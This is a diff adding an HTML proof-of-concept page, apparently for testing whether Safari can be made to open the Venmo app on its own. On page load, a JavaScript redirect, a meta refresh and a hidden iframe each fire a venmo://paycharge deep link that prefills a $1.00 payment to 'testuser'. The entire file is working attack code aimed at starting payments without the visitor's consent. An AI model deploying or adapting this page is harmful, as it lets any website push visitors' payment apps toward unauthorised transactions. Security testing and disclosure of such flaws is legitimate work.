@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Venmo PoC</title>
+    <script>
+        setTimeout(() => {
+            window.location.href = "venmo://paycharge?txn=pay&recipients=testuser&amount=1.00&note=Testing";
+        }, 100);
+    </script>
+    <meta http-equiv="refresh" content="0;url=venmo://paycharge?txn=pay&recipients=testuser&amount=1.00&note=Testing">
+</head>
+<body>
+    <h1>Testing Auto App Launch via Safari</h1>
+    <script>
+        setTimeout(() => {
+            let iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = "venmo://paycharge?txn=pay&recipients=testuser&amount=1.00&note=Testing";
+            document.body.appendChild(iframe);
+        }, 200);
+    </script>
+</body>
+</html>
